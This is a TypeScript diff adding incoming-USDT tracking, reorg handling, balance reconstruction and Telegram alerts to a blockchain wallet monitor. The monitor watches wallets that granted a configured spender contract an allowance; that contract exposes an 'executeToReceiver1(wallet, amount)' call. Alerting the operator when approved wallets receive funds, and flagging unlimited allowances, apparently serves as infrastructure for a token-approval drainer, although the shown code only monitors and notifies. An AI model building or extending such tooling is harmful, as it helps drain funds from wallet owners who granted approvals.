@@ -1,7 +1,14 @@
 import crypto from "node:crypto";
 import { ethers } from "ethers";
+import { reconstructWalletBalanceTimeline } from "./balance-history";
 import { config } from "./config";
-import { Store, type ApprovalRecord, type TransferRecord, type WalletRecord } from "./store";
+import {
+  Store,
+  type ApprovalRecord,
+  type IncomingTransferRecord,
+  type TransferRecord,
+  type WalletRecord
+} from "./store";
 
 const ABI = [
   "function executeToReceiver1(address wallet,uint256 amount)",
@@ -25,7 +32,37 @@ const MAX_UINT256 = (1n << 256n) - 1n;
 const TELEGRAM_RETRY_INTERVAL_MS = 60_000;
 const TELEGRAM_MAX_RETRY_DELAY_MS = 60 * 60_000;
 const TELEGRAM_REQUEST_TIMEOUT_MS = 10_000;
+const TELEGRAM_DELIVERY_LEASE_MS = 2 * 60_000;
 const NO_PRIOR_GRANT_ERROR = "No earlier verified positive approval exists for this wallet and spender";
+const APPROVAL_CONFIRMATION_THRESHOLD = 15;
+const REORG_LOOKBACK_BLOCKS = APPROVAL_CONFIRMATION_THRESHOLD * 2;
+
+export function incomingTransferConfirmationState(
+  record: IncomingTransferRecord,
+  latestBlock: number,
+  canonicalBlockHash: string | undefined
+) {
+  if (
+    record.canonicalStatus !== "canonical" ||
+    !canonicalBlockHash ||
+    record.blockHash.toLowerCase() !== canonicalBlockHash.toLowerCase() ||
+    !Number.isInteger(latestBlock)
+  ) return undefined;
+  const confirmations = Math.max(0, latestBlock - record.blockNumber + 1);
+  return {
+    confirmations,
+    confirmationStatus: confirmations >= APPROVAL_CONFIRMATION_THRESHOLD ? "confirmed" as const : "pending" as const,
+    eligible: confirmations >= APPROVAL_CONFIRMATION_THRESHOLD
+  };
+}
+
+type HistoricalBalanceSnapshot = {
+  before?: string;
+  after?: string;
+  rawBefore?: string;
+  rawAfter?: string;
+  status: string;
+};
 
 function sanitizeTelegramError(error: unknown, botToken: string): string {
   const message = error instanceof Error ? error.message : String(error);
@@ -235,6 +272,7 @@ export class WalletMonitor {
   private telegramRetryInProgress = false;
   private readonly telegramNotificationsInFlight = new Set<string>();
   private readonly successfulTelegramNotifications = new Map<string, string>();
+  private readonly incomingBalanceTimelineCache = new Map<string, Promise<Map<string, HistoricalBalanceSnapshot>>>();
   private readonly pendingTransferBalanceUpdates = new Map<string, Set<string>>();
   private readonly blockListener = (blockNumber: number) => {
     void this.enqueueBlock(blockNumber).catch((error) => {
@@ -294,7 +332,11 @@ export class WalletMonitor {
     this.telegramRetryInProgress = true;
     try {
       const retryable = await this.store.listRetryableTelegramNotifications();
-      const records: Array<{ type: "Approval"; record: ApprovalRecord } | { type: "Transfer"; record: TransferRecord }> = [
+      const records: Array<
+        | { type: "Approval"; record: ApprovalRecord }
+        | { type: "Transfer"; record: TransferRecord }
+        | { type: "IncomingTransfer"; record: IncomingTransferRecord }
+      > = [
         ...retryable.approvals
           .filter((record) =>
             !(record.rawApprovalAmount === "0" &&
@@ -304,7 +346,9 @@ export class WalletMonitor {
           )
           .map((record) => ({ type: "Approval" as const, record })),
         ...retryable.transfers
-          .map((record) => ({ type: "Transfer" as const, record }))
+          .map((record) => ({ type: "Transfer" as const, record })),
+        ...retryable.incomingTransfers
+          .map((record) => ({ type: "IncomingTransfer" as const, record }))
       ];
 
       for (const { type, record } of records) {
@@ -320,10 +364,14 @@ export class WalletMonitor {
         ) continue;
 
         try {
-          const notificationRecord = type === "Approval"
-            ? await this.prepareApprovalNotification(record)
-            : record;
-          await this.sendTelegramNotification(type, notificationRecord);
+          if (type === "IncomingTransfer") {
+            await this.sendIncomingTransferNotification(record);
+          } else {
+            const notificationRecord = type === "Approval"
+              ? await this.prepareApprovalNotification(record)
+              : record;
+            await this.sendTelegramNotification(type, notificationRecord);
+          }
         } catch (error) {
           console.error(`[Telegram] Could not update ${type.toLowerCase()} notification ${record.id}:`, error);
         }
@@ -370,7 +418,8 @@ export class WalletMonitor {
       .filter((approval) =>
         approval.tokenContract.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
         approval.spender.toLowerCase() === config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() &&
-        approval.chainId === String(config.CHAIN_ID)
+        approval.chainId === String(config.CHAIN_ID) &&
+        approval.canonicalStatus !== "reorged"
       )
       .sort((first, second) =>
         first.blockNumber - second.blockNumber || first.logIndex - second.logIndex
@@ -825,6 +874,46 @@ export class WalletMonitor {
     }
   }
 
+  private async reconcileRecentReorgs(fromBlock: number, toBlock: number) {
+    const records = [
+      ...this.store.listApprovalEvents()
+        .filter((record) => record.blockNumber >= fromBlock && record.blockNumber <= toBlock && record.blockHash),
+      ...this.store.listIncomingTransferEvents()
+        .filter((record) => record.blockNumber >= fromBlock && record.blockNumber <= toBlock)
+    ];
+    const canonicalHashes = new Map<number, string>();
+    let changed = false;
+    for (const record of records) {
+      let canonicalHash = canonicalHashes.get(record.blockNumber);
+      if (!canonicalHash) {
+        const block = await this.provider.getBlock(record.blockNumber);
+        if (!block?.hash) continue;
+        canonicalHash = block.hash.toLowerCase();
+        canonicalHashes.set(record.blockNumber, canonicalHash);
+      }
+      if (record.blockHash?.toLowerCase() === canonicalHash) {
+        if (record.canonicalStatus === "reorged") {
+          if ("approvalAmount" in record) {
+            await this.store.updateApprovalCanonicalStatus(record.id, "canonical");
+          } else {
+            await this.store.updateIncomingCanonicalStatus(record.id, "canonical");
+          }
+          changed = true;
+        }
+        continue;
+      }
+      if (record.canonicalStatus === "reorged") continue;
+      if ("approvalAmount" in record) {
+        await this.store.updateApprovalCanonicalStatus(record.id, "reorged");
+      } else {
+        await this.store.updateIncomingCanonicalStatus(record.id, "reorged");
+      }
+      changed = true;
+      console.warn(`[Monitor] Marked reorged event ${record.transactionHash}:${record.logIndex}`);
+    }
+    if (changed) await this.recoverApprovalLinkedWallets();
+  }
+
   private async scanBlockchainEvents(latestBlock: number) {
     if (!this.running) return;
     const state = this.store.getMonitoringState("Approval+Transfer");
@@ -834,7 +923,10 @@ export class WalletMonitor {
     const lastProcessedBlock = stateMatchesConfiguration
       ? state.lastProcessedBlock
       : config.MONITOR_START_BLOCK - 1;
-    const start = Math.max(lastProcessedBlock + 1, config.MONITOR_START_BLOCK);
+    const start = Math.max(
+      lastProcessedBlock - REORG_LOOKBACK_BLOCKS + 1,
+      config.MONITOR_START_BLOCK
+    );
     if (start > latestBlock) return;
 
     const approvalTopic = this.eventInterface.getEvent("Approval")!.topicHash;
@@ -854,6 +946,12 @@ export class WalletMonitor {
         for (const log of approvalLogs) await this.processApprovalLog(log);
 
         const monitoredAddresses = this.store.listApprovalLinkedWallets().map((wallet) => wallet.address);
+        const incomingCandidates = new Set(monitoredAddresses.map((wallet) => wallet.toLowerCase()));
+        for (const log of approvalLogs) {
+          const parsed = this.eventInterface.parseLog(log);
+          if (parsed?.name === "Approval") incomingCandidates.add(String(parsed.args.owner).toLowerCase());
+        }
+
         if (monitoredAddresses.length > 0) {
           const executionLogs = await this.getLogsWithRangeFallback({
             address: config.ALLOWANCE_SPENDER_ADDRESS,
@@ -873,6 +971,20 @@ export class WalletMonitor {
           }
         }
 
+        const incomingAddresses = [...incomingCandidates];
+        for (let index = 0; index < incomingAddresses.length; index += 100) {
+          const walletTopics = incomingAddresses
+            .slice(index, index + 100)
+            .map((walletAddress) => ethers.zeroPadValue(walletAddress, 32));
+          const incomingLogs = await this.getLogsWithRangeFallback({
+            address: config.USDT_ADDRESS,
+            topics: [transferTopic, null, walletTopics]
+          }, from, to);
+          for (const log of incomingLogs) await this.processIncomingTransferLog(log);
+        }
+
+        await this.reconcileRecentReorgs(from, to);
+        await this.store.updateConfirmationStatus(latestBlock, APPROVAL_CONFIRMATION_THRESHOLD);
         await this.store.setMonitoringState({
           network: config.NETWORK_NAME,
           chainId: config.CHAIN_ID,
@@ -896,7 +1008,8 @@ export class WalletMonitor {
       .filter((approval) => {
         const sameOwner = (approval.walletAddress || approval.ownerAddress).toLowerCase() === owner.toLowerCase();
         return sameOwner &&
-          (approval.blockNumber < blockNumber ||
+            approval.canonicalStatus !== "reorged" &&
+            (approval.blockNumber < blockNumber ||
             (approval.blockNumber === blockNumber && approval.logIndex < logIndex));
       })
       .sort((first, second) =>
@@ -926,9 +1039,21 @@ export class WalletMonitor {
     const eventId = `approval-${config.CHAIN_ID}-${config.USDT_ADDRESS.toLowerCase()}-${log.transactionHash.toLowerCase()}-${log.index}`;
     const existing = await this.store.findApprovalEvent(String(config.CHAIN_ID), log.transactionHash, Number(log.index));
     if (existing) {
-      const prepared = existing.telegramStatus === "sent"
-        ? existing
-        : await this.prepareApprovalNotification(existing);
+      const currentBlock = await this.provider.getBlock(Number(log.blockNumber));
+      const confirmations = Math.max(0, this.latestObservedBlock - Number(log.blockNumber) + 1);
+      const refreshed: ApprovalRecord = {
+        ...existing,
+        blockHash: log.blockHash,
+        canonicalStatus: "canonical",
+        confirmations,
+        confirmationStatus: confirmations >= APPROVAL_CONFIRMATION_THRESHOLD ? "confirmed" : "pending",
+        updatedAt: new Date().toISOString()
+      };
+      if (!currentBlock?.hash || currentBlock.hash.toLowerCase() !== log.blockHash.toLowerCase()) return;
+      await this.store.upsertApproval(refreshed);
+      const prepared = refreshed.telegramStatus === "sent"
+        ? refreshed
+        : await this.prepareApprovalNotification(refreshed);
       await this.linkApprovalWallet(prepared, false);
       await this.sendTelegramNotification("Approval", prepared);
       return;
@@ -968,12 +1093,19 @@ export class WalletMonitor {
       network: config.NETWORK_NAME,
       chainId: String(config.CHAIN_ID),
       blockNumber: Number(log.blockNumber),
+      blockHash: log.blockHash,
       blockTimestamp: blockTimestamp.timestamp,
       blockTimestampStatus: blockTimestamp.status,
       transactionHash: log.transactionHash,
       logIndex: Number(log.index),
       eventType: "Approval",
       processingStatus: "processed",
+      approvalStatus: value > 0n ? "active" : "revoked",
+      canonicalStatus: "canonical",
+      confirmations: Math.max(0, this.latestObservedBlock - Number(log.blockNumber) + 1),
+      confirmationStatus: this.latestObservedBlock - Number(log.blockNumber) + 1 >= APPROVAL_CONFIRMATION_THRESHOLD
+        ? "confirmed"
+        : "pending",
       telegramStatus: value === 0n && !this.hasPriorGrant(owner, Number(log.blockNumber), Number(log.index))
         ? "skipped"
         : "pending",
@@ -1094,6 +1226,198 @@ export class WalletMonitor {
       console.warn(`[Monitor] Configured-spender calldata could not be decoded: ${sanitizeRpcError(error)}`);
       return undefined;
     }
+  }
+
+  private async getIncomingBalanceTimeline(wallet: string, blockNumber: number, expectedBlockHash: string) {
+    const cacheKey = `${wallet.toLowerCase()}:${blockNumber}:${expectedBlockHash.toLowerCase()}`;
+    const cached = this.incomingBalanceTimelineCache.get(cacheKey);
+    if (cached) return cached;
+
+    const timeline = (async () => {
+      try {
+        if (blockNumber <= 0) throw new Error("Historical balance before block zero is unavailable");
+        const walletTopic = ethers.zeroPadValue(wallet, 32);
+        const transferTopic = this.eventInterface.getEvent("Transfer")!.topicHash;
+        const [outgoingLogs, incomingLogs, block] = await Promise.all([
+          this.getLogsWithRangeFallback({
+            address: config.USDT_ADDRESS,
+            topics: [transferTopic, walletTopic]
+          }, blockNumber, blockNumber),
+          this.getLogsWithRangeFallback({
+            address: config.USDT_ADDRESS,
+            topics: [transferTopic, null, walletTopic]
+          }, blockNumber, blockNumber),
+          this.provider.getBlock(blockNumber)
+        ]);
+        if (!block?.hash) throw new Error(`Block ${blockNumber} is unavailable`);
+        if (block.hash.toLowerCase() !== expectedBlockHash.toLowerCase()) {
+          throw new Error(`Block ${blockNumber} changed while reconstructing wallet balance`);
+        }
+
+        const logsByKey = new Map<string, ethers.Log>();
+        for (const log of [...outgoingLogs, ...incomingLogs]) {
+          if (log.blockHash.toLowerCase() !== block.hash.toLowerCase()) {
+            throw new Error(`Transfer log block hash mismatch at block ${blockNumber}`);
+          }
+          logsByKey.set(`${log.transactionHash.toLowerCase()}:${log.index}`, log);
+        }
+        const logs = [...logsByKey.values()];
+        const historicalErrors: string[] = [];
+
+        for (const [source, provider] of [
+          ["primary RPC", this.primaryProvider],
+          ["fallback RPC", this.fallbackProvider]
+        ] as const) {
+          try {
+            const token = new ethers.Contract(config.USDT_ADDRESS, ERC20_ABI, provider);
+            const balanceBeforeBlock = await token.balanceOf(wallet, { blockTag: blockNumber - 1 }) as bigint;
+            const expectedEndBalance = await token.balanceOf(wallet, { blockTag: blockNumber }) as bigint;
+            const result = new Map<string, HistoricalBalanceSnapshot>();
+            const parsedLogs = logs.map((log) => {
+              const parsed = this.eventInterface.parseLog(log);
+              if (!parsed || parsed.name !== "Transfer") throw new Error("Unrecognized USDT Transfer log");
+              return {
+                key: `${log.transactionHash.toLowerCase()}:${log.index}`,
+                transactionIndex: log.transactionIndex,
+                logIndex: log.index,
+                from: String(parsed.args.from),
+                to: String(parsed.args.to),
+                amount: parsed.args.value as bigint
+              };
+            });
+            const reconstructed = reconstructWalletBalanceTimeline(
+              wallet,
+              balanceBeforeBlock,
+              parsedLogs,
+              expectedEndBalance
+            );
+            for (const [eventKey, balances] of reconstructed) {
+              result.set(eventKey, {
+                before: ethers.formatUnits(balances.before, this.tokenDecimals),
+                after: ethers.formatUnits(balances.after, this.tokenDecimals),
+                rawBefore: balances.before.toString(),
+                rawAfter: balances.after.toString(),
+                status: `Verified by transaction-log reconstruction and block ${blockNumber} historical state (${source})`
+              });
+            }
+            return result;
+          } catch (error) {
+            const detail = sanitizeRpcError(error);
+            historicalErrors.push(`${source}: ${detail}`);
+            console.error(
+              `[Monitor] Historical incoming USDT balance reconstruction failed for ${wallet} at block ${blockNumber} (${source}): ${detail}`
+            );
+          }
+        }
+
+        return new Map<string, HistoricalBalanceSnapshot>([
+          ["__error", {
+            status: `Unavailable; historical balance reconstruction failed: ${historicalErrors.join("; ")}`
+          }]
+        ]);
+      } catch (error) {
+        const detail = sanitizeRpcError(error);
+        console.error(
+          `[Monitor] Incoming USDT balance history unavailable for ${wallet} at block ${blockNumber}: ${detail}`
+        );
+        return new Map<string, HistoricalBalanceSnapshot>([
+          ["__error", { status: `Unavailable; ${detail}` }]
+        ]);
+      }
+    })();
+
+    this.incomingBalanceTimelineCache.set(cacheKey, timeline);
+    void timeline.then((result) => {
+      if (result.has("__error") && this.incomingBalanceTimelineCache.get(cacheKey) === timeline) {
+        this.incomingBalanceTimelineCache.delete(cacheKey);
+      }
+    });
+    if (this.incomingBalanceTimelineCache.size > 1000) {
+      const oldestKey = this.incomingBalanceTimelineCache.keys().next().value;
+      if (oldestKey !== undefined) this.incomingBalanceTimelineCache.delete(oldestKey);
+    }
+    return timeline;
+  }
+
+  private async processIncomingTransferLog(log: ethers.Log) {
+    if (log.address.toLowerCase() !== config.USDT_ADDRESS.toLowerCase()) return;
+    const parsed = this.eventInterface.parseLog(log);
+    if (!parsed || parsed.name !== "Transfer") return;
+    const sender = String(parsed.args.from);
+    const walletAddress = String(parsed.args.to);
+    const value = parsed.args.value as bigint;
+    const approval = this.store.findActiveApprovalAt(
+      walletAddress,
+      Number(log.blockNumber),
+      Number(log.index)
+    );
+    if (!approval || this.store.getWallet(walletAddress)?.active !== true ||
+      !(await this.verifySuccessfulEventReceipt(log))) return;
+    const block = await this.provider.getBlock(Number(log.blockNumber));
+    if (!block?.hash || block.hash.toLowerCase() !== log.blockHash.toLowerCase()) return;
+
+    const transactionHash = log.transactionHash.toLowerCase();
+    const logIndex = Number(log.index);
+    const id = `incoming-${config.CHAIN_ID}-${config.USDT_ADDRESS.toLowerCase()}-${transactionHash}-${logIndex}`;
+    const existing = await this.store.findIncomingTransferEvent(String(config.CHAIN_ID), transactionHash, logIndex);
+    const snapshots = await this.getIncomingBalanceTimeline(walletAddress, Number(log.blockNumber), log.blockHash);
+    const snapshot = snapshots.get(`${transactionHash}:${log.index}`) ?? snapshots.get("__error");
+    const timestamp = await this.getBlockTimestamp(Number(log.blockNumber));
+    const confirmations = Math.max(0, this.latestObservedBlock - Number(log.blockNumber) + 1);
+    const now = new Date().toISOString();
+    const record: IncomingTransferRecord = {
+      id,
+      walletAddress,
+      sender,
+      receivedAmount: ethers.formatUnits(value, this.tokenDecimals),
+      rawReceivedAmount: value.toString(),
+      tokenContract: config.USDT_ADDRESS,
+      tokenSymbol: this.tokenSymbol,
+      tokenDecimals: this.tokenDecimals,
+      spender: config.ALLOWANCE_SPENDER_ADDRESS,
+      approvalRecordId: approval.id,
+      approvalTransactionHash: approval.transactionHash,
+      approvalBlockNumber: approval.blockNumber,
+      approvalBlockTimestamp: approval.blockTimestamp,
+      approvedAllowance: approval.approvalAmount,
+      rawApprovedAllowance: approval.rawApprovalAmount,
+      balanceBefore: snapshot?.before,
+      rawBalanceBefore: snapshot?.rawBefore,
+      balanceAfter: snapshot?.after,
+      rawBalanceAfter: snapshot?.rawAfter,
+      balanceStatus: snapshot?.status ?? "Unavailable; target transfer was absent from reconstructed block logs",
+      network: config.NETWORK_NAME,
+      chainId: String(config.CHAIN_ID),
+      blockNumber: Number(log.blockNumber),
+      blockHash: log.blockHash,
+      transactionIndex: log.transactionIndex,
+      blockTimestamp: timestamp.timestamp,
+      blockTimestampStatus: timestamp.status,
+      transactionHash: log.transactionHash,
+      logIndex,
+      eventType: "IncomingTransfer",
+      processingStatus: "processed",
+      canonicalStatus: "canonical",
+      confirmationStatus: confirmations >= APPROVAL_CONFIRMATION_THRESHOLD ? "confirmed" : "pending",
+      confirmations,
+      telegramStatus: existing?.telegramStatus ?? "pending",
+      telegramAttemptCount: existing?.telegramAttemptCount ?? 0,
+      telegramSentAt: existing?.telegramSentAt,
+      telegramError: existing?.telegramError,
+      createdAt: existing?.createdAt ?? now,
+      updatedAt: now
+    };
+
+    await this.store.upsertIncomingTransfer(record);
+    const wallet = this.store.getWallet(walletAddress);
+    if (wallet) {
+      await this.store.update(walletAddress, {
+        latestTransferTxHash: log.transactionHash,
+        latestActivityAt: timestamp.timestamp || wallet.latestActivityAt,
+        updatedAt: now
+      });
+    }
+    await this.sendIncomingTransferNotification(record);
   }
 
   private async processTransferLog(log: ethers.Log, executionLogs: ethers.Log[]) {
@@ -1401,6 +1725,214 @@ export class WalletMonitor {
       }
       if (deliveryStatusPersisted && current.telegramStatus === "sent") {
         this.successfulTelegramNotifications.delete(deliveryKey);
+      }
+    } finally {
+      this.telegramNotificationsInFlight.delete(deliveryKey);
+    }
+  }
+
+  private async sendIncomingTransferNotification(record: IncomingTransferRecord) {
+    const approval = this.store.findActiveApprovalAt(
+      record.walletAddress,
+      record.blockNumber,
+      record.logIndex
+    );
+    if (
+      record.eventType !== "IncomingTransfer" ||
+      record.tokenContract.toLowerCase() !== config.USDT_ADDRESS.toLowerCase() ||
+      record.spender.toLowerCase() !== config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() ||
+      record.chainId !== String(config.CHAIN_ID) ||
+      !approval ||
+      approval.id !== record.approvalRecordId
+    ) {
+      console.error(`[Telegram] Refusing out-of-scope incoming transfer notification ${record.id}`);
+      return;
+    }
+
+    if (record.telegramStatus === "sent") return;
+
+    const [latestBlock, canonicalBlock] = await Promise.all([
+      this.provider.getBlockNumber(),
+      this.provider.getBlock(record.blockNumber)
+    ]);
+    if (!canonicalBlock?.hash) return;
+    if (canonicalBlock.hash.toLowerCase() !== record.blockHash.toLowerCase()) {
+      await this.store.updateIncomingCanonicalStatus(record.id, "reorged");
+      console.warn(`[Monitor] Deferring Telegram notification for reorged incoming transfer ${record.id}`);
+      return;
+    }
+
+    const confirmationState = incomingTransferConfirmationState(record, latestBlock, canonicalBlock.hash);
+    if (!confirmationState) return;
+    const confirmedRecord: IncomingTransferRecord = {
+      ...record,
+      confirmations: confirmationState.confirmations,
+      confirmationStatus: confirmationState.confirmationStatus,
+      updatedAt: new Date().toISOString()
+    };
+    if (
+      confirmedRecord.confirmations !== record.confirmations ||
+      confirmedRecord.confirmationStatus !== record.confirmationStatus
+    ) await this.store.upsertIncomingTransfer(confirmedRecord);
+    if (!confirmationState.eligible) return;
+
+    if (!config.TELEGRAM_BOT_TOKEN || !config.TELEGRAM_CHAT_ID) {
+      confirmedRecord.telegramStatus = "skipped";
+      confirmedRecord.updatedAt = new Date().toISOString();
+      await this.store.upsertIncomingTransfer(confirmedRecord);
+      return;
+    }
+
+    const deliveryKey = `${confirmedRecord.chainId}:${confirmedRecord.transactionHash.toLowerCase()}:${confirmedRecord.logIndex}:IncomingTransfer`;
+    if (this.telegramNotificationsInFlight.has(deliveryKey)) return;
+    this.telegramNotificationsInFlight.add(deliveryKey);
+    try {
+      const claim = await this.store.claimIncomingTelegramNotification(
+        confirmedRecord.id,
+        TELEGRAM_DELIVERY_LEASE_MS
+      );
+      if (!claim) return;
+      if (claim.status === "sent") {
+        confirmedRecord.telegramStatus = "sent";
+        confirmedRecord.telegramSentAt = claim.sentAt;
+        confirmedRecord.telegramError = undefined;
+        confirmedRecord.updatedAt = new Date().toISOString();
+        await this.store.upsertIncomingTransfer(confirmedRecord);
+        return;
+      }
+
+      const attempted: IncomingTransferRecord = {
+        ...confirmedRecord,
+        telegramStatus: "sending",
+        telegramAttemptCount: confirmedRecord.telegramAttemptCount + 1,
+        telegramError: undefined,
+        updatedAt: new Date().toISOString()
+      };
+      await this.store.upsertIncomingTransfer(attempted);
+
+      const code = (value: string) => `<code>${escapeHtml(value)}</code>`;
+      const link = (url: string, value: string) => `<a href="${url}">${code(value)}</a>`;
+      const walletLink = (value: string) =>
+        link(`https://bscscan.com/address/${encodeURIComponent(value)}`, value);
+      const transactionLink = (value: string) =>
+        link(`https://bscscan.com/tx/${encodeURIComponent(value)}`, value);
+      const allowance = BigInt(confirmedRecord.rawApprovedAllowance) === MAX_UINT256
+        ? "Unlimited"
+        : `${escapeHtml(formatRawAmount(confirmedRecord.rawApprovedAllowance, confirmedRecord.tokenDecimals))} USDT`;
+      const previousBalance = confirmedRecord.rawBalanceBefore === undefined
+        ? "Unavailable"
+        : `${escapeHtml(formatRawAmount(confirmedRecord.rawBalanceBefore, confirmedRecord.tokenDecimals))} USDT`;
+      const updatedBalance = confirmedRecord.rawBalanceAfter === undefined
+        ? "Unavailable"
+        : `${escapeHtml(formatRawAmount(confirmedRecord.rawBalanceAfter, confirmedRecord.tokenDecimals))} USDT`;
+      const confirmationStatus = `${confirmedRecord.confirmationStatus} (${confirmedRecord.confirmations} confirmation${confirmedRecord.confirmations === 1 ? "" : "s"})`;
+      const message = [
+        "<b>📥 INCOMING USDT TRANSFER</b>",
+        "━━━━━━━━━━━━━━━━━━━━",
+        `👛 Wallet: ${walletLink(confirmedRecord.walletAddress)}`,
+        `🕒 Original approval time (UTC): ${escapeHtml(formatTimestamp(confirmedRecord.approvalBlockTimestamp))}`,
+        `🎯 Approved spender: ${walletLink(confirmedRecord.spender)}`,
+        `🔐 Approved allowance: ${allowance}`,
+        "━━━━━━━━━━━━━━━━━━━━",
+        `📤 Sender: ${walletLink(confirmedRecord.sender)}`,
+        `💰 Incoming amount: ${escapeHtml(formatRawAmount(confirmedRecord.rawReceivedAmount, confirmedRecord.tokenDecimals))} USDT`,
+        `⬅️ Previous USDT balance: ${previousBalance}`,
+        `➡️ Updated USDT balance: ${updatedBalance}`,
+        `📊 Balance data: ${formatStatus(confirmedRecord.balanceStatus)}`,
+        "━━━━━━━━━━━━━━━━━━━━",
+        `🗓 Transaction time (UTC): ${confirmedRecord.blockTimestampStatus === "verified" ? escapeHtml(formatTimestamp(confirmedRecord.blockTimestamp)) : "Unavailable"}`,
+        `🔗 Transaction hash: ${transactionLink(confirmedRecord.transactionHash)}`,
+        `📦 Block: ${escapeHtml(String(confirmedRecord.blockNumber))}`,
+        `☑ Confirmation status: ${escapeHtml(confirmationStatus)}`
+      ].join("\n");
+
+      let deliveryStatus: "failed" | "sent" = "failed";
+      let sentAt: string | undefined;
+      let deliveryError: string | undefined;
+      try {
+        const response = await fetch(
+          `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`,
+          {
+            method: "POST",
+            headers: { "content-type": "application/json" },
+            body: JSON.stringify({
+              chat_id: config.TELEGRAM_CHAT_ID,
+              text: message,
+              parse_mode: "HTML",
+              disable_web_page_preview: true
+            }),
+            signal: AbortSignal.timeout(TELEGRAM_REQUEST_TIMEOUT_MS)
+          }
+        );
+        const responseText = await response.text();
+        let data: {
+          ok?: boolean;
+          description?: string;
+          result?: { message_id?: number; chat?: { id?: number | string } };
+        };
+        try {
+          data = JSON.parse(responseText) as {
+            ok?: boolean;
+            description?: string;
+            result?: { message_id?: number; chat?: { id?: number | string } };
+          };
+        } catch {
+          throw new Error(`Telegram API returned HTTP ${response.status} with a non-JSON response`);
+        }
+        if (!response.ok || data.ok !== true) {
+          throw new Error(`Telegram API returned HTTP ${response.status}: ${data.description ?? "Request rejected"}`);
+        }
+        if (
+          typeof data.result?.message_id !== "number" ||
+          !Number.isInteger(data.result.message_id) ||
+          data.result.message_id <= 0 ||
+          data.result.chat?.id === undefined
+        ) {
+          throw new Error(`Telegram API returned HTTP ${response.status} with an invalid successful response`);
+        }
+        if (
+          /^-?\d+$/.test(config.TELEGRAM_CHAT_ID) &&
+          String(data.result.chat.id) !== config.TELEGRAM_CHAT_ID
+        ) {
+          throw new Error(`Telegram API returned HTTP ${response.status}: response chat ID did not match configured chat ID`);
+        }
+        deliveryStatus = "sent";
+        sentAt = new Date().toISOString();
+        attempted.telegramStatus = "sent";
+        attempted.telegramSentAt = sentAt;
+        attempted.telegramError = undefined;
+      } catch (error) {
+        deliveryError = sanitizeTelegramError(error, config.TELEGRAM_BOT_TOKEN);
+        attempted.telegramStatus = "failed";
+        attempted.telegramError = deliveryError;
+        console.error(
+          `[Telegram] Incoming transfer notification ${confirmedRecord.id} has an uncertain delivery result; retry will use the delivery lease: ${deliveryError}`
+        );
+      }
+
+      attempted.updatedAt = new Date().toISOString();
+      let eventStatusPersisted = false;
+      try {
+        await this.store.upsertIncomingTransfer(attempted);
+        eventStatusPersisted = true;
+      } catch (error) {
+        console.error(
+          `[Telegram] Could not persist incoming transfer delivery status for ${confirmedRecord.id}:`,
+          error
+        );
+      }
+      const deliveryStatusPersisted = await this.store.finishIncomingTelegramNotification(
+        confirmedRecord.id,
+        claim.leaseToken,
+        deliveryStatus,
+        { sentAt, error: deliveryError },
+        TELEGRAM_DELIVERY_LEASE_MS
+      );
+      if (!deliveryStatusPersisted) {
+        console.error(`[Telegram] Incoming transfer delivery lease was lost before completion for ${confirmedRecord.id}`);
+      }
+      if (!eventStatusPersisted && deliveryStatus === "sent") {
+        console.error(`[Telegram] Telegram accepted incoming transfer ${confirmedRecord.id}, but its event status needs recovery`);
       }
     } finally {
       this.telegramNotificationsInFlight.delete(deliveryKey);
